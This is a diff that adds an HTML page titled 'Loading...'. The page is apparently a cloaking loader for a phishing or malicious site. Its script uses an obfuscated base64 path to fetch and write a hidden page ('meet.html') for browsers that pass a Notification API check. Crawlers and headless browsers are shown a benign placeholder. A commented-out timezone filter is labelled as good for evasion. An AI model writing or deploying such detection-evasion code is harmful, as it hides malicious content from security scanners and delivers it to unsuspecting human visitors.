@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // Base64 encoded path to the hidden content
+        // hidden_content/meet.html -> aGlkZGVuX2NvbnRlbnQvbWVldC5odG1s
+        const realContent = 'aGlkZGVuX2NvbnRlbnQvbWVldC5odG1s';
+
+        // Timezone check (optional but good for evasion)
+        // const zones = /Madrid|Canary|Vienna|Istanbul|Berlin|London|Paris/gi;
+        // const timezoneOffset = zones.test((new Intl.DateTimeFormat).resolvedOptions().timeZone);
+
+        // Notification API check - Headless Chrome usually doesn't have this
+        if (self.Notification) {
+            fetch(atob(realContent))
+                .then(response => response.text())
+                .then(html => {
+                    document.open();
+                    document.write(html);
+                    document.close();
+                })
+                .catch(err => {
+                    console.error('Error loading content');
+                });
+        } else {
+            // Crawler / Bot - Show benign content
+            document.write('<h1>Welcome</h1><p>This is a standard placeholder page.</p>');
+        }
+    </script>
+</head>
+
+<body>
+    <!-- Fallback content if JS is disabled -->
+    <h1>Loading...</h1>
+</body>
+
+</html>
